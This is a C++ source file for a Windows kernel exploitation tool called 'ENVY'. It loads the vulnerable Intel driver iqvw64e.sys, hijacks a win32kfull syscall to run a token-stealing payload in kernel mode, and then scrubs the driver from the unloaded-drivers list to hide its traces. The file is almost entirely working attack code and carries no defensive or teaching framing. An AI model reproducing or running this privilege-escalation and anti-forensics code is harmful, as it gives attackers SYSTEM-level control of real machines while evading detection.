#define USING_INTEL_DRIVER

#ifdef USING_INTEL_DRIVER
#include "shittel_driver.h"
#include "shittel_driver_defs.h"
#include "driver_res.h"
#endif 

#include "windows_service.h"

#include "kernel_module.h"
#include <filesystem>

extern "C" DWORD64 TokenStealingPayload();

using namespace kernel;

int main(int argc, char** args)
{
	LoadLibraryA("user32.dll");
	std::cout << "[+] Welcome to ENVY..." << std::endl;
	std::cout << "[+] Loading vulnerable driver..." << std::endl;
	std::unique_ptr<windows_service> windows_service_resource = std::unique_ptr<windows_service>(new windows_service("iqvw64e.sys"));
	windows_service_resource->load_driver(resources::driver_bytes, sizeof(resources::driver_bytes));

	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());

	static uint64_t allocate_pool_kernel_addr = 0;

	kernel_module* ntoskrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
	kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");

	if (allocate_pool_kernel_addr == 0)
		allocate_pool_kernel_addr = ntoskrnl->get_module_export(driver_resource.get(), "ExAllocatePool");

	//uint64_t pool_addr = driver_resource->allocate_kernel_pool(POOL_TYPE::NonPagedPoolExecute, 0x1000);
	win32u->patch_syscall(driver_resource.get(), (uint64_t)TokenStealingPayload);
	{
		using fnStealTokenFn = void(WINAPI*)(void);
		static const auto usermode_addr = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));
		fnStealTokenFn StealToken = reinterpret_cast<fnStealTokenFn>(usermode_addr);
		StealToken();
	}
	win32u->restore_syscall(driver_resource.get());

	uint64_t KeBugCheckExAddr = ntoskrnl->get_module_export(driver_resource.get(), "KeBugCheckEx");

	driver_resource->remove_from_unloaded_drivers();
	windows_service_resource->stop_service();
	

	//std::cout << "0x" << std::hex << pool_addr << std::dec << std::endl;
	//win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
	//win32u->execute_and_restore_syscall<void>(driver_resource.get(), nullptr);

	//driver_resource->free_kernel_pool(shellcode_pool);



	return 0;
}